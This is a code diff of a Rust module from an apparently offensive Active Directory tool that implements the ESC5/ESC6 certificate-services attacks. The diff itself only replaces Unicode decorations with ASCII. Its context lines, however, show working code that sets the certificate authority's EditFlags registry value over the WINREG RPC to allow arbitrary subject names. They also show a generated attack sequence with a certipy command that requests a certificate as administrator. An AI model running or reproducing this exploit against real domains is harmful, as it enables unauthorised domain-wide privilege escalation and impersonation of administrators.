@@ -1,6 +1,6 @@
-//! ESC5 — Vulnerable PKI Object Access Control
+//! ESC5 -- Vulnerable PKI Object Access Control
 //!
-//! ESC5 targets **weak ACLs on PKI objects** in AD (not templates — that's ESC4).
+//! ESC5 targets **weak ACLs on PKI objects** in AD (not templates -- that's ESC4).
 //! Specifically, if an attacker has WriteDacl/WriteOwner on:
 //!
 //!   - CA object in CN=Enrollment Services
@@ -14,16 +14,16 @@
 //! ESC6 requires registry modification on the CA server, which ESC5 ACL abuse
 //! may grant access to.
 //!
-//! Reference: SpecterOps "Certified Pre-Owned" — ESC5, ESC6
+//! Reference: SpecterOps "Certified Pre-Owned" -- ESC5, ESC6
 
 use crate::error::{OverthroneError, Result};
 use crate::proto::ldap::LdapSession;
 use crate::proto::smb::SmbSession;
 use tracing::{debug, info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Constants
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6)
 const EDITF_ATTRIBUTESUBJECTALTNAME2: u32 = 0x00040000;
@@ -34,9 +34,9 @@ const EDITF_ATTRIBUTEENDDATE: u32 = 0x00100000;
 /// Registry path template for CA policy module EditFlags
 pub const EDITFLAGS_REG_PATH: &str = r"SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{CA_NAME}\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy";
 
-// ═══════════════════════════════════════════════════════════
-// ESC5 — PKI Object ACL Abuse (LDAP-based)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+// ESC5 -- PKI Object ACL Abuse (LDAP-based)
+// ===========================================================
 
 /// Target for ESC5 PKI object ACL abuse
 pub struct Esc5Target {
@@ -204,9 +204,9 @@ impl Esc5Target {
         })
     }
 
-    // ─────────────────────────────────────────────────────────
-    // ESC6 — Registry flag commands (command generation)
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
+    // ESC6 -- Registry flag commands (command generation)
+    // ---------------------------------------------------------
 
     /// Get the registry path for EditFlags
     fn reg_path(&self) -> String {
@@ -283,21 +283,21 @@ impl Esc5Target {
         );
 
         Ok(format!(
-            "╔═══════════════════════════════════════════════╗\n\
-             ║          ESC5/ESC6 — CA Configuration          ║\n\
-             ╚═══════════════════════════════════════════════╝\n\n\
+            "+===============================================+\n\
+             |          ESC5/ESC6 -- CA Configuration          |\n\
+             +===============================================+\n\n\
              CA: {ca}\n\
              Server: {server}\n\
              Attacker: {user}\n\n\
-             ── Step 1: Check current EditFlags ────────────\n\
+             -- Step 1: Check current EditFlags ------------\n\
              {read}\n\n\
-             ── Step 2: Enable SAN flag (ESC6) ─────────────\n\
+             -- Step 2: Enable SAN flag (ESC6) -------------\n\
              {enable}\n\n\
-             ── Step 3: Request cert with arbitrary SAN ────\n\
+             -- Step 3: Request cert with arbitrary SAN ----\n\
              certipy req -u '{user}@{domain}' -p 'PASSWORD' \\\n\
                -ca '{ca}' -target '{server}' \\\n\
                -template User -upn administrator@{domain}\n\n\
-             ── Restore ────────────────────────────────────\n\
+             -- Restore ------------------------------------\n\
              {restore}\n",
             ca = self.ca_name,
             server = self.ca_server,
@@ -310,9 +310,9 @@ impl Esc5Target {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Result types
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Result of ESC5 ACL check
 #[derive(Debug, Clone)]
@@ -334,28 +334,28 @@ impl std::fmt::Display for Esc5AclResult {
         if self.vulnerable {
             writeln!(f, "[!] ESC5 VULNERABLE: {} ({})", self.ca_name, self.ca_dn)?;
             for finding in &self.findings {
-                writeln!(f, "    → {}", finding)?;
+                writeln!(f, "    -> {}", finding)?;
             }
         } else {
-            writeln!(f, "[✓] {} — No weak ACLs detected", self.ca_name)?;
+            writeln!(f, "[[+]] {} -- No weak ACLs detected", self.ca_name)?;
         }
         Ok(())
     }
 }
 
-// ═══════════════════════════════════════════════════════════
-// ESC6 — Native WINREG RPC (MS-RRP over SMB \pipe\winreg)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+// ESC6 -- Native WINREG RPC (MS-RRP over SMB \pipe\winreg)
+// ===========================================================
 
 /// Read the `EditFlags` DWORD from the CA policy module registry key via
 /// native WINREG RPC (MS-RRP protocol over SMB `\pipe\winreg`).
 /// Caller must have already connected `smb` to the CA server.
-/// Flow: Bind → OpenLocalMachine → OpenKey(policy_path) →
-///       QueryValue("EditFlags") → CloseKey × 2
+/// Flow: Bind -> OpenLocalMachine -> OpenKey(policy_path) ->
+///       QueryValue("EditFlags") -> CloseKey × 2
 pub async fn read_editflags_rpc(smb: &SmbSession, reg_path: &str) -> Result<u32> {
     info!("WINREG: reading EditFlags from '{}'", reg_path);
 
-    // ── Bind to MS-RRP ────────────────────────────────────
+    // -- Bind to MS-RRP ------------------------------------
     let bind = winreg_bind_pdu();
     let bresp = smb.pipe_transact("winreg", &bind).await?;
     if bresp.len() < 4 || bresp[2] != 12 {
@@ -365,7 +365,7 @@ pub async fn read_editflags_rpc(smb: &SmbSession, reg_path: &str) -> Result<u32>
         });
     }
 
-    // ── OpenLocalMachine ──────────────────────────────────
+    // -- OpenLocalMachine ----------------------------------
     const KEY_READ: u32 = 0x0002_0019;
     let olm_req = winreg_open_local_machine(KEY_READ);
     let olm_resp = smb.pipe_transact("winreg", &olm_req).await?;
@@ -374,7 +374,7 @@ pub async fn read_editflags_rpc(smb: &SmbSession, reg_path: &str) -> Result<u32>
         reason: "OpenLocalMachine returned unexpected handle".into(),
     })?;
 
-    // ── OpenKey(reg_path) ──────────────────────────────────
+    // -- OpenKey(reg_path) ----------------------------------
     let ok_req = winreg_open_key(&hive, reg_path, KEY_READ);
     let ok_resp = smb.pipe_transact("winreg", &ok_req).await?;
     let key = parse_rrpchandle(&ok_resp).ok_or_else(|| OverthroneError::Rpc {
@@ -382,7 +382,7 @@ pub async fn read_editflags_rpc(smb: &SmbSession, reg_path: &str) -> Result<u32>
         reason: format!("OpenKey('{}') failed", reg_path),
     })?;
 
-    // ── QueryValue("EditFlags") ───────────────────────────
+    // -- QueryValue("EditFlags") ---------------------------
     let qv_req = winreg_query_value(&key, "EditFlags");
     let qv_resp = smb.pipe_transact("winreg", &qv_req).await?;
     let flags = parse_query_dword(&qv_resp).ok_or_else(|| OverthroneError::Rpc {
@@ -390,7 +390,7 @@ pub async fn read_editflags_rpc(smb: &SmbSession, reg_path: &str) -> Result<u32>
         reason: "Could not parse EditFlags DWORD from QueryValue response".into(),
     })?;
 
-    // ── CloseKey (best-effort) ────────────────────────────
+    // -- CloseKey (best-effort) ----------------------------
     let _ = smb.pipe_transact("winreg", &winreg_close_key(&key)).await;
     let _ = smb.pipe_transact("winreg", &winreg_close_key(&hive)).await;
 
@@ -407,7 +407,7 @@ pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32)
         new_flags, reg_path
     );
 
-    // ── Bind ──────────────────────────────────────────────
+    // -- Bind ----------------------------------------------
     let bind = winreg_bind_pdu();
     let bresp = smb.pipe_transact("winreg", &bind).await?;
     if bresp.len() < 4 || bresp[2] != 12 {
@@ -417,7 +417,7 @@ pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32)
         });
     }
 
-    // ── OpenLocalMachine ──────────────────────────────────
+    // -- OpenLocalMachine ----------------------------------
     const KEY_ALL_ACCESS: u32 = 0x0002_003F;
     let olm_req = winreg_open_local_machine(KEY_ALL_ACCESS);
     let olm_resp = smb.pipe_transact("winreg", &olm_req).await?;
@@ -426,7 +426,7 @@ pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32)
         reason: "OpenLocalMachine returned invalid handle".into(),
     })?;
 
-    // ── OpenKey ───────────────────────────────────────────
+    // -- OpenKey -------------------------------------------
     let ok_req = winreg_open_key(&hive, reg_path, KEY_ALL_ACCESS);
     let ok_resp = smb.pipe_transact("winreg", &ok_req).await?;
     let key = parse_rrpchandle(&ok_resp).ok_or_else(|| OverthroneError::Rpc {
@@ -434,7 +434,7 @@ pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32)
         reason: format!("OpenKey('{}') failed", reg_path),
     })?;
 
-    // ── SetValue ──────────────────────────────────────────
+    // -- SetValue ------------------------------------------
     const REG_DWORD: u32 = 4;
     let sv_req = winreg_set_value(&key, "EditFlags", REG_DWORD, &new_flags.to_le_bytes());
     let sv_resp = smb.pipe_transact("winreg", &sv_req).await?;
@@ -446,7 +446,7 @@ pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32)
         });
     }
 
-    // ── CloseKey ──────────────────────────────────────────
+    // -- CloseKey ------------------------------------------
     let _ = smb.pipe_transact("winreg", &winreg_close_key(&key)).await;
     let _ = smb.pipe_transact("winreg", &winreg_close_key(&hive)).await;
 
@@ -454,9 +454,9 @@ pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32)
     Ok(())
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // WINREG NDR helpers (MS-RRP)
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Build DCE/RPC BIND PDU for MS-RRP (UUID 338cd001-2244-31f1-aaaa-900038001003 v1.0).
 fn winreg_bind_pdu() -> Vec<u8> {
@@ -510,7 +510,7 @@ fn winreg_open_key(hkey: &[u8; 20], subkey: &str, sam_desired: u32) -> Vec<u8> {
     winreg_req(15, &stub)
 }
 
-/// WINREG QueryValue (opnum 17) — requests up to 512 bytes of data.
+/// WINREG QueryValue (opnum 17) -- requests up to 512 bytes of data.
 fn winreg_query_value(hkey: &[u8; 20], value_name: &str) -> Vec<u8> {
     const MAX_DATA: u32 = 512;
     let mut stub = Vec::new();
@@ -524,7 +524,7 @@ fn winreg_query_value(hkey: &[u8; 20], value_name: &str) -> Vec<u8> {
     stub.extend_from_slice(&0x0002_0028u32.to_le_bytes()); // referent
     // pcbLen: non-null unique ptr, deferred DWORD = 0
     stub.extend_from_slice(&0x0002_002Cu32.to_le_bytes()); // referent
-    // ── Deferred values ───────────────────────────────────
+    // -- Deferred values -----------------------------------
     // lpType deferred: DWORD = 0
     stub.extend_from_slice(&0u32.to_le_bytes());
     // lpData deferred: conformant array (max_count + MAX_DATA bytes)
@@ -623,7 +623,7 @@ fn parse_rrpchandle(resp: &[u8]) -> Option<[u8; 20]> {
 /// The DWORD data appears after the handle, type, conformant size markers.
 fn parse_query_dword(resp: &[u8]) -> Option<u32> {
     // Stub: lpType(4) + max_count(4) + data[...] + lpcbData(4) + pcbLen(4) + rc(4)
-    // We just scan for the data — it's at the known offset after the header.
+    // We just scan for the data -- it's at the known offset after the header.
     const HDR: usize = 24;
     if resp.len() < HDR + 20 {
         return None;
@@ -662,9 +662,9 @@ fn winreg_return_code(resp: &[u8]) -> u32 {
     u32::from_le_bytes([resp[off], resp[off + 1], resp[off + 2], resp[off + 3]])
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Tests
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 #[cfg(test)]
 mod tests {
